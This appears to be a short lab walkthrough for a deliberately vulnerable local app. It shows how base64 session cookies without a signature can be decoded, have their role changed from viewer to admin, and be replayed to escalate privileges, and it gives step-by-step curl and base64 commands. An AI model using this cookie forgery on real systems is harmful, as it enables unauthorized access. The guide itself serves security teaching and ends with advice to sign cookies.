## Unsigned Cookies (Data Integrity Failure)

### What is it?
When session cookies contain user data (like role/permissions) encoded in plain base64 without any cryptographic signature, an attacker can **decode, modify, and re-encode** the cookie to escalate their privileges.

### Prerequisites
Start the vulnerable server:

```Bash
uvicorn vulnerable:app --reload
```

### Exploitation Steps

**1. Login as a Normal User**

```Bash
curl -X POST "http://127.0.0.1:8000/login?username=john&password=pass456"
```

Expected Response:
```JSON
{"message": "Logged in", "cookie_value": "eyJ1c2VyIjogImpvaG4iLCAicm9sZSI6ICJ2aWV3ZXIifQ=="}
```

**2. Decode the Cookie**

```Bash
echo "eyJ1c2VyIjogImpvaG4iLCAicm9sZSI6ICJ2aWV3ZXIifQ==" | base64 -d
```

Output:
```JSON
{"user": "john", "role": "viewer"}
```

**3. Tamper with the Cookie (Privilege Escalation)**

Change `"role": "viewer"` to `"role": "admin"` and re-encode:

```Bash
echo -n '{"user": "john", "role": "admin"}' | base64
```

Output:
```
eyJ1c2VyIjogImpvaG4iLCAicm9sZSI6ICJhZG1pbiJ9
```

**4. Use the Tampered Cookie**

```Bash
curl http://127.0.0.1:8000/dashboard \
     -H "Cookie: session=eyJ1c2VyIjogImpvaG4iLCAicm9sZSI6ICJhZG1pbiJ9"
```

Expected Response:
```JSON
{"message": "Welcome Admin!", "secret": "Database password: Pr0d_S3cret!"}
```

The attacker escalated from `viewer` to `admin` by simply editing the cookie!

**Result:** Without cryptographic signing (HMAC), the server has no way to verify the cookie wasn't modified. Always sign sensitive cookies and validate the signature server-side.
